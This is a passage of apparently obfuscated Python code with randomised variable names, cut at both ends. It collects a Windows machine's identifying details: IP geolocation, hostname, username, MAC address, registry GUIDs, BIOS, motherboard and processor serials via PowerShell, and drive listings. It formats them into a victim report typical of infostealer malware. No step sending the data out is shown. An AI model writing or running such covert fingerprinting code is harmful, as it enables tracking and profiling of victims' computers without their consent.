    GAOQESZMFZKMQBQYDHKDLUNWHTQTNHRUHOWHOTAXKEXBCVLDSNZDTQMWVZSIMXLMJOQFKJCFZUVFQEJTJQWGMDFBVKUNPVLAWLW = UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN.get('lat', "None")
    RYYXVDSDAUDYIKWFSJJFQUIVUUMDWCIJUGHJFHUNBKDEFCZUZVRYMAANQHYNYXAD = UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN.get('lon', "None")
    STWCFHQJUOJIWNVNNMDFLUOFNCIJBQOIJZPXPCLVMEKSLJNASYDFJAQXCJZFTCESVSBYRRLNEMRVHOXCVXYSVAXOVEJTGPMKKS = UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN.get('timezone', "None")
    QBRPJDJTUBPQBGXMJNHMDVFEDVQTPIEZMELOWNTFFNDHPRYUIBFSWOABNWGJCPIAMXKTIHWMZNZYZWKQLE = UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN.get('isp', "None")
    RMZEIFLXIULAXDTVOIKFOCSUCQSKWAJZSXWVRNBKGIDFVHXIPZJEXFDEUUURZIVYCLAFKDHCBVSAXBPLOHNQ = UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN.get('org', "None")
    AGYJJKJJXNNPMCAHHLINWJKEDEAPQOCIJEUBKPZYIGTWZQDMCQT = UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN.get('as', "None")

def KJFLZUDLLTVLMBFXIHFMUJXGGYSGIMVAXBBSBUFNQOCGYMVRNRTGIGVZW(KKXLQLQEXRGKNBKDEGZIVFFRLKQKFZUEZHKTKBPTBTCSZYESGFMKXW):
    import platform
    import subprocess
    import uuid
    import psutil
    import GPUtil
    import ctypes
    import win32api
    import string
    import screeninfo
    import winreg

    try: JLQHXDXAJBPJWYTXVKWYYHGCUERRMJRJZYATHHKIJJMYXRBFAEQCFOCIMZGVTXTLBXPF = platform.system()
    except: JLQHXDXAJBPJWYTXVKWYYHGCUERRMJRJZYATHHKIJJMYXRBFAEQCFOCIMZGVTXTLBXPF = "None"

    try: IJAIRJZQMEYUPSJNBARIXYTMEOBDLCMKRQPATJBLPUWVYDANXKM = platform.version()
    except: IJAIRJZQMEYUPSJNBARIXYTMEOBDLCMKRQPATJBLPUWVYDANXKM = "None"

    try: WZOLDNGTFWXDNIOLFQYASNHKHBWQXGMNKGEJOOOJCIEIQGXSJXHNRZJSLUNAAVIWJSQVHBSBYENWHJPYZUOBHM = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
    except: WZOLDNGTFWXDNIOLFQYASNHKHBWQXGMNKGEJOOOJCIEIQGXSJXHNRZJSLUNAAVIWJSQVHBSBYENWHJPYZUOBHM = "None"

    try: BZJNRINSOHUFHGJTBKQKMPHWGGRCXLFQENCOXTLHSBQAGETDFQFQPAUASRRGRQKNIDJPZTCHYUKRS = str(round(psutil.virtual_memory().total / (1024**3), 2)) + "Go"
    except: BZJNRINSOHUFHGJTBKQKMPHWGGRCXLFQENCOXTLHSBQAGETDFQFQPAUASRRGRQKNIDJPZTCHYUKRS = "None"

    try: XRJHJHYRQXYRMBHSNDDSLNXJMPTUKPXFUQQTWBDUXCWYYWAEAVCTTEGWKPDVPFNIFNWNOCVNUXJPTAILPRABMUJPARIWCJLO = platform.processor()
    except: XRJHJHYRQXYRMBHSNDDSLNXJMPTUKPXFUQQTWBDUXCWYYWAEAVCTTEGWKPDVPFNIFNWNOCVNUXJPTAILPRABMUJPARIWCJLO = "None"

    try: IGCJRBQOYTHYPIWWAURXALTWUYBMOUXYPRRICKPIHSQHGNPFIVGNTKZHUOLCBGQKHKBHUE = str(psutil.cpu_count(logical=False)) + " Core"
    except: IGCJRBQOYTHYPIWWAURXALTWUYBMOUXYPRRICKPIHSQHGNPFIVGNTKZHUOLCBGQKHKBHUE = "None"

    try: JYVEKPQBESBGVQPTCJCYXREKOXWWWKTMMJXQNSIELNBLRGJNPBPYFPUTEEIPZINSQCLDXJRREBXDYODSHFFVQUXNEZQAWENVECA = GPUtil.getGPUs()[0].name if GPUtil.getGPUs() else "None"
    except: JYVEKPQBESBGVQPTCJCYXREKOXWWWKTMMJXQNSIELNBLRGJNPBPYFPUTEEIPZINSQCLDXJRREBXDYODSHFFVQUXNEZQAWENVECA = "None"

    WLCWRKDWIFPVKAKNBQPCYTALDWMVICFXUREVHMFWPPJGUMDRCEOOEKNNEJOVPTKAIWBIHITGB                 = r"SOFTWARE\Microsoft\Cryptography"
    PTLNRRLZWDYZBOBTRVOLGEKHUNJEOUKNTXSIQALDJNWWORNYRXZDCUPCVHZHARECMEZXP                    = r"SOFTWARE\Microsoft\SQMClient"
    WUZHZZWPEXGRDKHEUHHOPCOJCWKQQFWPRIGJYLTKGALMNVVAWCGNSOASKFSCNNKZFKAZFNKQNYXHSVAS             = r"SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware Profiles\0001"
    OZQDJVVZYOJDFSILCBXWSNXCERNRTXTSGQBHNNMUSVRAZDLCUKSCOZKQTODVM                       = r'SOFTWARE\NVIDIA Corporation'
    JTDFEFHWCWIELUGITYBQZYXXRNFCCRLUTMVPURGQGPRMRUSBWWPNCQIGLAZRQNNVIPZNZFOFWUCGEQSHQKTPJTTEDUQFN               = r'SYSTEM\HardwareConfig\Current'

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, WLCWRKDWIFPVKAKNBQPCYTALDWMVICFXUREVHMFWPPJGUMDRCEOOEKNNEJOVPTKAIWBIHITGB, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "MachineGuid")
            QNQWXTZOJIRAOBOPLNAZXMDAVAGTMFAKDLUJRLJPWXURWKOGTWJEYL = str(v4r_value).replace("{", "").replace("}", "")
    except: QNQWXTZOJIRAOBOPLNAZXMDAVAGTMFAKDLUJRLJPWXURWKOGTWJEYL = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, WUZHZZWPEXGRDKHEUHHOPCOJCWKQQFWPRIGJYLTKGALMNVVAWCGNSOASKFSCNNKZFKAZFNKQNYXHSVAS, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "GUID")
            AAYQZTOFNRMCFDIOZMWVZSEESDSXVVNMHIKMQJKDODFPTZMOTUUDVIBGQR = str(v4r_value).replace("{", "").replace("}", "")
    except: AAYQZTOFNRMCFDIOZMWVZSEESDSXVVNMHIKMQJKDODFPTZMOTUUDVIBGQR = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, WUZHZZWPEXGRDKHEUHHOPCOJCWKQQFWPRIGJYLTKGALMNVVAWCGNSOASKFSCNNKZFKAZFNKQNYXHSVAS, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "HwProfileGuid")
            YDUXUGGIRWLCHLZGOTYTJHBVWGUUIKMEFHNQJZMJAVNSSYAVLMACCCXCQZLQXUXVRXNYOERRUEH = str(v4r_value).replace("{", "").replace("}", "")
    except: YDUXUGGIRWLCHLZGOTYTJHBVWGUUIKMEFHNQJZMJAVNSSYAVLMACCCXCQZLQXUXVRXNYOERRUEH = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, PTLNRRLZWDYZBOBTRVOLGEKHUNJEOUKNTXSIQALDJNWWORNYRXZDCUPCVHZHARECMEZXP, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "MachineId")
            PARJBWIKLGSWOSZBWHDSOKLGQZVTVEIAUVOSHXHPLATGKUMGWHLMVNTSJSPEMCJJTVNJMHXCPUETBPJOLBOVBBNRPXSBOA = str(v4r_value).replace("{", "").replace("}", "")
    except: PARJBWIKLGSWOSZBWHDSOKLGQZVTVEIAUVOSHXHPLATGKUMGWHLMVNTSJSPEMCJJTVNJMHXCPUETBPJOLBOVBBNRPXSBOA = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, OZQDJVVZYOJDFSILCBXWSNXCERNRTXTSGQBHNNMUSVRAZDLCUKSCOZKQTODVM+r'\Installer2', 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemID")
            TFGYOOEQLNJSYEHBLOXBBDMQKNGINESESEJNRRFBIBRZTRQCQBWSSGVFQZFEPPORPJEEMAYKVLJBWO = str(v4r_value).replace("{", "").replace("}", "")
    except: TFGYOOEQLNJSYEHBLOXBBDMQKNGINESESEJNRRFBIBRZTRQCQBWSSGVFQZFEPPORPJEEMAYKVLJBWO = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, JTDFEFHWCWIELUGITYBQZYXXRNFCCRLUTMVPURGQGPRMRUSBWWPNCQIGLAZRQNNVIPZNZFOFWUCGEQSHQKTPJTTEDUQFN, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "BaseBoardProduct")
            UQKZKPXMGQVUEHWYJYYVMGTTUNVWLIAQRFZPAMVUGOFZFIGWUXTXJZLMRXXCGCM = str(v4r_value).replace("{", "").replace("}", "")
    except: UQKZKPXMGQVUEHWYJYYVMGTTUNVWLIAQRFZPAMVUGOFZFIGWUXTXJZLMRXXCGCM = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, JTDFEFHWCWIELUGITYBQZYXXRNFCCRLUTMVPURGQGPRMRUSBWWPNCQIGLAZRQNNVIPZNZFOFWUCGEQSHQKTPJTTEDUQFN, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "BaseBoardManufacturer")
            FQRFUWDWILCMUVCVMCZIGOCJKLSCNPFHPNMOBRFWMHIJKZZPLUBWRLNBEMVWJOOTUTPGOSZT = str(v4r_value).replace("{", "").replace("}", "")
    except: FQRFUWDWILCMUVCVMCZIGOCJKLSCNPFHPNMOBRFWMHIJKZZPLUBWRLNBEMVWJOOTUTPGOSZT = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, JTDFEFHWCWIELUGITYBQZYXXRNFCCRLUTMVPURGQGPRMRUSBWWPNCQIGLAZRQNNVIPZNZFOFWUCGEQSHQKTPJTTEDUQFN, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "BIOSReleaseDate")
            CYSIOWISPCMDLRZGRNDTMCIVWYATWZHPPEUGJLAYBYKEMGNRKUALOVTPGYOMMMKYSOHIES = str(v4r_value).replace("{", "").replace("}", "")
    except: CYSIOWISPCMDLRZGRNDTMCIVWYATWZHPPEUGJLAYBYKEMGNRKUALOVTPGYOMMMKYSOHIES = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, JTDFEFHWCWIELUGITYBQZYXXRNFCCRLUTMVPURGQGPRMRUSBWWPNCQIGLAZRQNNVIPZNZFOFWUCGEQSHQKTPJTTEDUQFN, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "BIOSVersion")
            LFMZCIMHFHWNKTWKZQHMWGLAAXJWWZTKFWJFFIOCVPGKNMTSMLVJVWLNLWGOBTJM = str(v4r_value).replace("{", "").replace("}", "")
    except: LFMZCIMHFHWNKTWKZQHMWGLAAXJWWZTKFWJFFIOCVPGKNMTSMLVJVWLNLWGOBTJM = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, JTDFEFHWCWIELUGITYBQZYXXRNFCCRLUTMVPURGQGPRMRUSBWWPNCQIGLAZRQNNVIPZNZFOFWUCGEQSHQKTPJTTEDUQFN, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemBiosVersion")
            PILQQTDOJGXSTKHUXDWUXYBPPJLTVTALJWOWLVHKTBIUTDIBKJNMNABLEVNFCNNMIBNXLUZYMQBRYFBIWLW = str(v4r_value).replace("{", "").replace("}", "")
    except: PILQQTDOJGXSTKHUXDWUXYBPPJLTVTALJWOWLVHKTBIUTDIBKJNMNABLEVNFCNNMIBNXLUZYMQBRYFBIWLW = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, JTDFEFHWCWIELUGITYBQZYXXRNFCCRLUTMVPURGQGPRMRUSBWWPNCQIGLAZRQNNVIPZNZFOFWUCGEQSHQKTPJTTEDUQFN, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemVersion")
            ONKNFPHQVAQHMPTOXOTRFCGEIYXCSLESOLAVCMJABAOKYZSCKOVKPRPSHDOPBWTOASFANLBNIAQYDBKOVEIBBWNINVYSMQNYUJ = str(v4r_value).replace("{", "").replace("}", "")
    except: ONKNFPHQVAQHMPTOXOTRFCGEIYXCSLESOLAVCMJABAOKYZSCKOVKPRPSHDOPBWTOASFANLBNIAQYDBKOVEIBBWNINVYSMQNYUJ = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, JTDFEFHWCWIELUGITYBQZYXXRNFCCRLUTMVPURGQGPRMRUSBWWPNCQIGLAZRQNNVIPZNZFOFWUCGEQSHQKTPJTTEDUQFN, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemFamily")
            OLTQFFHNFWDEAJDXPNFFKWJJTODXDGSOPJYBMZEDHIYGAXCHWQCUEWBWECRRSNHYNII = str(v4r_value).replace("{", "").replace("}", "")
    except: OLTQFFHNFWDEAJDXPNFFKWJJTODXDGSOPJYBMZEDHIYGAXCHWQCUEWBWECRRSNHYNII = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, JTDFEFHWCWIELUGITYBQZYXXRNFCCRLUTMVPURGQGPRMRUSBWWPNCQIGLAZRQNNVIPZNZFOFWUCGEQSHQKTPJTTEDUQFN, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemManufacturer")
            JIDXFDIOCFLQMVUREHMWWJIFLFGIZPOGLUICMIYVZPECTXHBTYSSEXKPMVVNZBEPTZIZGIQPKOTZJTPRQZQTUGXPMYCCMQSVUG = str(v4r_value).replace("{", "").replace("}", "")
    except: JIDXFDIOCFLQMVUREHMWWJIFLFGIZPOGLUICMIYVZPECTXHBTYSSEXKPMVVNZBEPTZIZGIQPKOTZJTPRQZQTUGXPMYCCMQSVUG = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, JTDFEFHWCWIELUGITYBQZYXXRNFCCRLUTMVPURGQGPRMRUSBWWPNCQIGLAZRQNNVIPZNZFOFWUCGEQSHQKTPJTTEDUQFN, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemProductName")
            WNCBKCAJMMUOWLVCRTGDFGURVRFGKADGLOLJOCZDMTBKKRMYURRPGGMJYKARFKEKSLVPPPNSQXMCCUHWCNUJUKO = str(v4r_value).replace("{", "").replace("}", "")
    except: WNCBKCAJMMUOWLVCRTGDFGURVRFGKADGLOLJOCZDMTBKKRMYURRPGGMJYKARFKEKSLVPPPNSQXMCCUHWCNUJUKO = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, JTDFEFHWCWIELUGITYBQZYXXRNFCCRLUTMVPURGQGPRMRUSBWWPNCQIGLAZRQNNVIPZNZFOFWUCGEQSHQKTPJTTEDUQFN, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemSKU")
            WXZVBZALHCZMPZPCBBMJBZBUEKDPOTPUHUYTMUMXAJFVTFAAWERCPOCGHSJPPLGFAEFFGZQHHSDYACZOKAXGRFXZ = str(v4r_value).replace("{", "").replace("}", "")
    except: WXZVBZALHCZMPZPCBBMJBZBUEKDPOTPUHUYTMUMXAJFVTFAAWERCPOCGHSJPPLGFAEFFGZQHHSDYACZOKAXGRFXZ = None

    def RunPowershell(query):
        try:
            result = subprocess.check_output(
                ['powershell', '-Command', query],
                stderr=subprocess.STDOUT,
                text=True
            ).split('\n')[0].strip()
            return result if result else None
        except:
            return None

    try: GSJFBYVDNIJVMNUOIALQCVPVQQMXPYMWKCKDPQNZBAZDOTYXHIBIUSZRURZDKTRFESCDUQYQFGPMDRMRZFUYVU = RunPowershell("(Get-WmiObject -Class Win32_ComputerSystemProduct).UUID")
    except: GSJFBYVDNIJVMNUOIALQCVPVQQMXPYMWKCKDPQNZBAZDOTYXHIBIUSZRURZDKTRFESCDUQYQFGPMDRMRZFUYVU = None

    try: OAWIEIXKGOUBZZZDCFNSWDPEJCSFQDTBLQDFLOXDRXCFGFQINXPJOFMYARWWOOTJBDEOTIRLZDPYRNWPTRCYXASFZXAX = RunPowershell("(Get-WmiObject -Class Win32_BIOS).SerialNumber")
    except: OAWIEIXKGOUBZZZDCFNSWDPEJCSFQDTBLQDFLOXDRXCFGFQINXPJOFMYARWWOOTJBDEOTIRLZDPYRNWPTRCYXASFZXAX = None

    try: XSNASRCFZUKEUVYHGVCWLSMBGHELZRZSSXBXPOZYQJBSPNHLNDMIRADMMGXQFBGVAYWMA = RunPowershell("(Get-WmiObject -Class Win32_BaseBoard).SerialNumber")
    except: XSNASRCFZUKEUVYHGVCWLSMBGHELZRZSSXBXPOZYQJBSPNHLNDMIRADMMGXQFBGVAYWMA = None

    try: MIZIJORYJUNOUJIOAWRGNSZDIWFMJPUAITHQQZJUBQOOJXWEVIIRHQLHZWQJCVVRJINRVEWYXWHDHSPGVDGPWOP = RunPowershell("(Get-WmiObject -Class Win32_Processor).ProcessorId")
    except: MIZIJORYJUNOUJIOAWRGNSZDIWFMJPUAITHQQZJUBQOOJXWEVIIRHQLHZWQJCVVRJINRVEWYXWHDHSPGVDGPWOP = None

    try: YGPPNUKSVJQGAGNOIVHDXQFNKZUCALYAZYVPKLVFLSWPUDBQYXYSBWGFWRXM = RunPowershell("(Get-WmiObject -Class Win32_BIOS).OEMStringArray")
    except: YGPPNUKSVJQGAGNOIVHDXQFNKZUCALYAZYVPKLVFLSWPUDBQYXYSBWGFWRXM = None

    try: ISEHWBCJBXLWWPEVIRQEQIOCHNIQODXCWJFTEVBGQEEQRRVIGPTRNXXQIOIYZFVQYAZKMRURWXNSZOQBXUUT = RunPowershell("(Get-WmiObject -Class Win32_SystemEnclosure).SMBIOSAssetTag")
    except: ISEHWBCJBXLWWPEVIRQEQIOCHNIQODXCWJFTEVBGQEEQRRVIGPTRNXXQIOIYZFVQYAZKMRURWXNSZOQBXUUT = None
        
    try:
        OCTLTZNLUPPGRTDCYCZZHIKGKXWALXLCHVQPSWXLOBZMEHGHHMBJMFNZZTOBUSNUIWDEKIARSROREFSMIRJG = []
        DLUOOKBHLRUSUFTOWECNDGKHYKHEHXSDRTMFXYUKVPCBGUPEOT = ctypes.windll.kernel32.GetLogicalDrives()
        for v4r_letter in string.ascii_uppercase:
            if DLUOOKBHLRUSUFTOWECNDGKHYKHEHXSDRTMFXYUKVPCBGUPEOT & 1:
                LKINQEPNTMQGWDRKAKSILIZAIWBRPHUWLIFSRUMQEAPVFXYGAXOVKBVN = v4r_letter + ":\\"
                try:
                    YOMJHAIPIRMIHUXRLWHXMVUPBZLFMQWEICNGHPVVGFKKBOGMLPUNJCTAKQEIRTHL = ctypes.c_ulonglong(0)
                    EJRPIVRWGBDHBUCWLAYJTWBYTQLCANLSLPNHZKOJYSXJTHQPWOMOJYGI = ctypes.c_ulonglong(0)
                    ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p(LKINQEPNTMQGWDRKAKSILIZAIWBRPHUWLIFSRUMQEAPVFXYGAXOVKBVN), None, ctypes.pointer(EJRPIVRWGBDHBUCWLAYJTWBYTQLCANLSLPNHZKOJYSXJTHQPWOMOJYGI), ctypes.pointer(YOMJHAIPIRMIHUXRLWHXMVUPBZLFMQWEICNGHPVVGFKKBOGMLPUNJCTAKQEIRTHL))
                    ZNXXJWFWQLRZNZJGWUHGSGZEMRKVLBBNOIIBWRJDSPZZCJKLEZVOMHFXNLKRAJRPG = EJRPIVRWGBDHBUCWLAYJTWBYTQLCANLSLPNHZKOJYSXJTHQPWOMOJYGI.value
                    DPRKUQSZDROJAKQZOKPAHDYDEYTHGFWNUINWXCJWKBIJTDNIXZFTJBHBHTBM = YOMJHAIPIRMIHUXRLWHXMVUPBZLFMQWEICNGHPVVGFKKBOGMLPUNJCTAKQEIRTHL.value
                    RYUHWNLBZLKEJDSBJXMPTNIVYPUVBQFWZOCHRMVEUDPAROKJHYLXSAWIVOPEGUYEUQ = ZNXXJWFWQLRZNZJGWUHGSGZEMRKVLBBNOIIBWRJDSPZZCJKLEZVOMHFXNLKRAJRPG - DPRKUQSZDROJAKQZOKPAHDYDEYTHGFWNUINWXCJWKBIJTDNIXZFTJBHBHTBM
                    TFINOUCMIPUZDOXEQFTERKKHMORVOMMMOURMMGZGIIYVKCJMYQWPTTIMCSONCRQLJEWPGVRCMQIUVLLFDGQHALQ = win32api.GetVolumeInformation(LKINQEPNTMQGWDRKAKSILIZAIWBRPHUWLIFSRUMQEAPVFXYGAXOVKBVN)[0]
                    drive = {
                        'drive': LKINQEPNTMQGWDRKAKSILIZAIWBRPHUWLIFSRUMQEAPVFXYGAXOVKBVN,
                        'total': ZNXXJWFWQLRZNZJGWUHGSGZEMRKVLBBNOIIBWRJDSPZZCJKLEZVOMHFXNLKRAJRPG,
                        'free': DPRKUQSZDROJAKQZOKPAHDYDEYTHGFWNUINWXCJWKBIJTDNIXZFTJBHBHTBM,
                        'used': RYUHWNLBZLKEJDSBJXMPTNIVYPUVBQFWZOCHRMVEUDPAROKJHYLXSAWIVOPEGUYEUQ,
                        'name': TFINOUCMIPUZDOXEQFTERKKHMORVOMMMOURMMGZGIIYVKCJMYQWPTTIMCSONCRQLJEWPGVRCMQIUVLLFDGQHALQ,
                    }
                    OCTLTZNLUPPGRTDCYCZZHIKGKXWALXLCHVQPSWXLOBZMEHGHHMBJMFNZZTOBUSNUIWDEKIARSROREFSMIRJG.append(drive)
                except:
                    ()
            DLUOOKBHLRUSUFTOWECNDGKHYKHEHXSDRTMFXYUKVPCBGUPEOT >>= 1

        OAUECSQLZOYGTZORGVCBEUHQZHGXBSCPHMMHBRHINGNPCCLTVMEBQCAVJLDQ = "   {:<7} {:<10} {:<10} {:<10} {:<20}".format("Drive:", "Free:", "Total:", "Use:", "Name:")
        for v4r_drive in OCTLTZNLUPPGRTDCYCZZHIKGKXWALXLCHVQPSWXLOBZMEHGHHMBJMFNZZTOBUSNUIWDEKIARSROREFSMIRJG:
            MPYATEABOVQANAZVCAGZZFPQMTDTLELBCMKPMHUCGWWOTUNIEKHTWDVPVRAAYKFG = (v4r_drive['used'] / v4r_drive['total']) * 100
            DPRKUQSZDROJAKQZOKPAHDYDEYTHGFWNUINWXCJWKBIJTDNIXZFTJBHBHTBM_gb = "{:.2f}GO".format(v4r_drive['free'] / (1024 ** 3))
            ZNXXJWFWQLRZNZJGWUHGSGZEMRKVLBBNOIIBWRJDSPZZCJKLEZVOMHFXNLKRAJRPG_gb = "{:.2f}GO".format(v4r_drive['total'] / (1024 ** 3))
            MPYATEABOVQANAZVCAGZZFPQMTDTLELBCMKPMHUCGWWOTUNIEKHTWDVPVRAAYKFG_str = "{:.2f}%".format(MPYATEABOVQANAZVCAGZZFPQMTDTLELBCMKPMHUCGWWOTUNIEKHTWDVPVRAAYKFG)
            OAUECSQLZOYGTZORGVCBEUHQZHGXBSCPHMMHBRHINGNPCCLTVMEBQCAVJLDQ += "\n - {:<7} {:<10} {:<10} {:<10} {:<20}".format(v4r_drive['drive'], 
                                                                   DPRKUQSZDROJAKQZOKPAHDYDEYTHGFWNUINWXCJWKBIJTDNIXZFTJBHBHTBM_gb,
                                                                   ZNXXJWFWQLRZNZJGWUHGSGZEMRKVLBBNOIIBWRJDSPZZCJKLEZVOMHFXNLKRAJRPG_gb,
                                                                   MPYATEABOVQANAZVCAGZZFPQMTDTLELBCMKPMHUCGWWOTUNIEKHTWDVPVRAAYKFG_str,
                                                                   v4r_drive['name'])
    except:
        OAUECSQLZOYGTZORGVCBEUHQZHGXBSCPHMMHBRHINGNPCCLTVMEBQCAVJLDQ = """   Drive:  Free:      Total:     Use:       Name:       
   None    None       None       None       None     
"""

    try:
        def IsPortable():
            try:
                battery = psutil.sensors_battery()
                return battery is not None and battery.power_plugged is not None
            except AttributeError:
                return False

        if IsPortable():
            GQISMHVLMOONSQWVOSVFXQGBJOWJDJNXTRGCXUUPFTRGNYUINQQSAVEHYFOWVFLOCDTNNRLWAXPZNBDCSAIZJWE = 'Pc Portable'
        else:
            GQISMHVLMOONSQWVOSVFXQGBJOWJDJNXTRGCXUUPFTRGNYUINQQSAVEHYFOWVFLOCDTNNRLWAXPZNBDCSAIZJWE = 'Pc Fixed'
    except:
        GQISMHVLMOONSQWVOSVFXQGBJOWJDJNXTRGCXUUPFTRGNYUINQQSAVEHYFOWVFLOCDTNNRLWAXPZNBDCSAIZJWE = "None"

    try: LGUYZOVVOYLWQVPEPVZGREWGBSJKSNQCEIODQBJQDTSRKQNKJPVQFNUV = len(screeninfo.get_monitors())
    except: LGUYZOVVOYLWQVPEPVZGREWGBSJKSNQCEIODQBJQDTSRKQNKJPVQFNUV = "None"

    ECDOVQJSYBYPIHYNQHPUZQIKKHDDOVADVTNZSXGWFUBTGARGZYKUUMWJAQIHTGNDRKK_system_info = "Yes"
    OFICAEUBYOBZNTEXNAUCZYRMCNFQYRDCXEHUPJRACACIQBCYADCCPHAX = f"""
User Pc:
 - Hostname    : {BXBJHLVWDMAFCBOSPVWEZRTIZDPPWCDUEOOPGUGPQNNWGTKAHIARENMYEDMAGVEYVUSFREGSMMTNIXJQMYULFHXWPHXYE}
 - Username    : {BJFTZVPNDTUSITXPRZGIGHMNXVIUZCKJALYICJKKCWPJUFFJYRRGKNUTMSGXUZLKRZVPMASXZSQWOLYAQFUSCS}
 - DisplayName : {LQFGKMIUJJOUHMJQYLQAVJITSZMUQNJRJBFMDUBXSYFXTUDGCKS}

System:
 - Plateform     : {GQISMHVLMOONSQWVOSVFXQGBJOWJDJNXTRGCXUUPFTRGNYUINQQSAVEHYFOWVFLOCDTNNRLWAXPZNBDCSAIZJWE}
 - Exploitation  : {JLQHXDXAJBPJWYTXVKWYYHGCUERRMJRJZYATHHKIJJMYXRBFAEQCFOCIMZGVTXTLBXPF} {IJAIRJZQMEYUPSJNBARIXYTMEOBDLCMKRQPATJBLPUWVYDANXKM}
 - Screen Number : {LGUYZOVVOYLWQVPEPVZGREWGBSJKSNQCEIODQBJQDTSRKQNKJPVQFNUV}

Peripheral:
 - CPU : {XRJHJHYRQXYRMBHSNDDSLNXJMPTUKPXFUQQTWBDUXCWYYWAEAVCTTEGWKPDVPFNIFNWNOCVNUXJPTAILPRABMUJPARIWCJLO}, {IGCJRBQOYTHYPIWWAURXALTWUYBMOUXYPRRICKPIHSQHGNPFIVGNTKZHUOLCBGQKHKBHUE} 
 - GPU : {JYVEKPQBESBGVQPTCJCYXREKOXWWWKTMMJXQNSIELNBLRGJNPBPYFPUTEEIPZINSQCLDXJRREBXDYODSHFFVQUXNEZQAWENVECA}
 - RAM : {BZJNRINSOHUFHGJTBKQKMPHWGGRCXLFQENCOXTLHSBQAGETDFQFQPAUASRRGRQKNIDJPZTCHYUKRS}

Disk:
{OAUECSQLZOYGTZORGVCBEUHQZHGXBSCPHMMHBRHINGNPCCLTVMEBQCAVJLDQ}

Serial Number:
 - MAC                       : {WZOLDNGTFWXDNIOLFQYASNHKHBWQXGMNKGEJOOOJCIEIQGXSJXHNRZJSLUNAAVIWJSQVHBSBYENWHJPYZUOBHM}
 - Machine Id                : {PARJBWIKLGSWOSZBWHDSOKLGQZVTVEIAUVOSHXHPLATGKUMGWHLMVNTSJSPEMCJJTVNJMHXCPUETBPJOLBOVBBNRPXSBOA}
 - Machine Guid              : {QNQWXTZOJIRAOBOPLNAZXMDAVAGTMFAKDLUJRLJPWXURWKOGTWJEYL}
 - Hw Profile Guid           : {YDUXUGGIRWLCHLZGOTYTJHBVWGUUIKMEFHNQJZMJAVNSSYAVLMACCCXCQZLQXUXVRXNYOERRUEH}
 - Nvidia System Id          : {TFGYOOEQLNJSYEHBLOXBBDMQKNGINESESEJNRRFBIBRZTRQCQBWSSGVFQZFEPPORPJEEMAYKVLJBWO}
 - Guid Serial Number        : {AAYQZTOFNRMCFDIOZMWVZSEESDSXVVNMHIKMQJKDODFPTZMOTUUDVIBGQR}
 - Uuid Serial Number        : {GSJFBYVDNIJVMNUOIALQCVPVQQMXPYMWKCKDPQNZBAZDOTYXHIBIUSZRURZDKTRFESCDUQYQFGPMDRMRZFUYVU}
 - Motherboard Serial Number : {XSNASRCFZUKEUVYHGVCWLSMBGHELZRZSSXBXPOZYQJBSPNHLNDMIRADMMGXQFBGVAYWMA}
 - Motherboard Product       : {UQKZKPXMGQVUEHWYJYYVMGTTUNVWLIAQRFZPAMVUGOFZFIGWUXTXJZLMRXXCGCM}
 - Motherboard Manufacturer  : {FQRFUWDWILCMUVCVMCZIGOCJKLSCNPFHPNMOBRFWMHIJKZZPLUBWRLNBEMVWJOOTUTPGOSZT}
